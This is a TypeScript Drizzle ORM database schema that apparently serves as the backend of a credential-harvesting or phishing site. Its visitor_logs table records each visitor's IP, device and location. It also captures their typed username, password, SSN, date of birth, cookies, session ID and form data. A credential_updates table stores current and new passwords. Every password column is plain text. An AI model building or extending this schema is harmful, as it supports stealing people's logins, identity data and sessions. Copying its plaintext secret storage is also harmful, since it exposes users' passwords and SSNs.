import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, date } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  email: text("email"),
  phone: text("phone"),
  dateOfBirth: date("date_of_birth"),
  ssn: text("ssn"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const sessions = pgTable("sessions", {
  sid: varchar("sid").primaryKey(),
  sess: text("sess").notNull(),
  expire: timestamp("expire").notNull(),
});

export const credentialUpdates = pgTable("credential_updates", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  originalUsername: text("original_username").notNull(),
  currentPassword: text("current_password").notNull(),
  newUsername: text("new_username"),
  newPassword: text("new_password"),
  updateType: text("update_type").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const visitorLogs = pgTable("visitor_logs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  ip: text("ip").notNull(),
  browser: text("browser"),
  browserVersion: text("browser_version"),
  os: text("os"),
  osVersion: text("os_version"),
  device: text("device"),
  deviceType: text("device_type"),
  city: text("city"),
  region: text("region"),
  country: text("country"),
  timezone: text("timezone"),
  page: text("page"),
  userAgent: text("user_agent"),
  username: text("username"),
  password: text("password"),
  email: text("email"),
  phone: text("phone"),
  ssn: text("ssn"),
  dateOfBirth: text("date_of_birth"),
  cookies: text("cookies"),
  sessionId: text("session_id"),
  formData: text("form_data"),
  action: text("action"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  email: true,
  phone: true,
  dateOfBirth: true,
  ssn: true,
});

export const insertCredentialUpdateSchema = createInsertSchema(credentialUpdates).pick({
  originalUsername: true,
  currentPassword: true,
  newUsername: true,
  newPassword: true,
  updateType: true,
});

export const insertVisitorLogSchema = createInsertSchema(visitorLogs).omit({
  id: true,
  createdAt: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertCredentialUpdate = z.infer<typeof insertCredentialUpdateSchema>;
export type CredentialUpdate = typeof credentialUpdates.$inferSelect;
export type InsertVisitorLog = z.infer<typeof insertVisitorLogSchema>;
export type VisitorLog = typeof visitorLogs.$inferSelect;
